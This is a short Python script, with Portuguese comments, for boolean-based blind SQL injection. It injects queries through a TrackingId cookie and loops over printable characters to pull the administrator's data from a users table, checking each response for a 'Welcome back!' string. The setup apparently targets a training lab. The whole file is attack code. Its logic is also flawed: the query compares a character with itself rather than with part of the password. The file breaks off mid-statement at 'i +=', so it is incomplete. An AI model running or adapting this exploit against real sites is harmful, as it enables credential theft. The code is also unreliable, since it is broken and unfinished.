#!/usr/bin/python
import requests
import string
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exploit(query):
    
    url = sys.argv[1]
    data = {"csrf": "wS67Dmu1EUVhFCUkWs0J2GJ60Katpzbr", "username":"admin", "password":"admin" }
    cookies = {"TrackingId":f"aYjAXEkwQJybnFM0'{query}", "session":"2eYC9e8XoItuy4E1LXmb5bpKtuGbM5xb"}
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} 
    r = requests.post(url, data = data, cookies = cookies)

    return r

if __name__ == "__main__":
    
    print(len(sys.argv))
    if len(sys.argv) <= 1:
        print(f"usage: {sys.argv[0]} url")
        exit(1)
    #TODOS OS CARACTERES PRINTAVEIS

    printables = string.printable
    valueIWant = ''

    for char in printables:
        print(char)

    #LOOP PARA PEGAR OS DADOS DE UM BANCO COM BOOLEAN BASED
    #CASO CAIA NO TRIGGER, SOMA A LETRA USADA NO VALOR 'valueIWant' ATÉ TER TODO O NOME 

    i=0

    while True:
        for char in printables:
            # query = input(f"[*] {bcolors.FAIL}QUERY:{bcolors.ENDC} ")
            query = f"AND (SELECT '{char}' FROM users WHERE username = 'administrator')='{char}"
            resp = exploit(query)
            
            if "Welcome back!" in resp.text:
                print(f"{bcolors.OKGREEN}triggou{bcolors.ENDC}\n")
            else:
                print(f"{bcolors.WARNING}não triggou{bcolors.ENDC}\n")

        i +=

